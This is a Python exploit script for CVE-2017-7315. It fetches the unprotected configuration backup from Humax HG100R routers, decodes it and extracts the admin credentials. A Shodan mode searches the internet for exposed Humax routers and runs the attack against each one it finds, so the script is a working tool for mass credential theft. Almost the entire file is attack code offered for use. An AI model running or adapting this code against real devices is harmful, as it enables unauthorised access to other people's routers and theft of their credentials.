# coding: utf-8

# Exploit Title: Humax Backup file download
# Date: 29/06/2017
# Exploit Author: gambler
# Vendor Homepage: http://humaxdigital.com
# Version: VER 2.0.6
# Tested on: OSX Linux
# CVE : CVE-2017-7315

import sys
import base64
import shodan
import requests
import subprocess

def banner():
    print '''
 ██░ ██  █    ██  ███▄ ▄███▓ ▄▄▄      ▒██   ██▒
▓██░ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄    ▒▒ █ █ ▒░
▒██▀▀██░▓██  ▒██░▓██    ▓██░▒██  ▀█▄  ░░  █   ░
░▓█ ░██ ▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██  ░ █ █ ▒
░▓█▒░██▓▒▒█████▓ ▒██▒   ░██▒ ▓█   ▓██▒▒██▒ ▒██▒
 ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░
 ▒ ░▒░ ░░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░░   ░▒ ░
 ░  ░░ ░ ░░░ ░ ░ ░      ░     ░   ▒    ░    ░
 ░  ░  ░   ░            ░         ░  ░ ░    ░
    '''
    print 'Description: Humax HG100R backup file download'
    print 'Software Version: VER 2.0.6'
    print 'SDK Version: 5.7.1mp1'
    print 'IPv6 Stack Version: 1.2.2'
    print 'Author: Gambler'
    print 'Vulnerability founded: 14/03/2016'
    print 'CVE: waiting'
    print

def xplHelp():
    print 'Exploit syntax error, Example:'
    print 'python xpl.py http://192.168.0.1'

def exploit(server):
    path = '/view/basic/GatewaySettings.bin'
    if not server.startswith('http'):
        server = 'http://%s' % server
    if server.endswith('/'):
        server = server[:-1]+''
    url = '%s/%s' %(server,path)
    print '[+] - Downloading configuration file and decoding'
    try:
        r = requests.get(url, stream=True,timeout=10)
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                rawdata = r.content
        save(rawdata)
    except:
        pass

def save(rawdata):
    config = base64.b64decode(rawdata).decode('ascii','ignore').replace('^@','')
    open('config.txt', 'w').write(config)
    print '[+] - Done, file saved as config.txt'
    infos = subprocess.Popen(["strings config.txt | grep -A 1 admin"], shell=True,stdout=subprocess.PIPE).communicate()[0]
    print '[+] - Credentials found'
    print infos

def shodanSearch():
    SHODAN_API_KEY = "SHODAN_API_KEY"
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
            results = api.search('Copyright © 2014 HUMAX Co., Ltd. All rights reserved.')
            print 'Results found: %s' % results['total']
            for result in results['matches']:
                    router = 'http://%s:%s' % (result['ip_str'],result['port'])
                    print router
                    exploit(router)
    except shodan.APIError, e:
            print 'Error: %s' % e


if __name__ == '__main__':

    if len(sys.argv) < 2:
        xplHelp()
        sys.exit()
    banner()
    if sys.argv[1] == 'shodan':
        shodanSearch()
    else:
        exploit(sys.argv[1])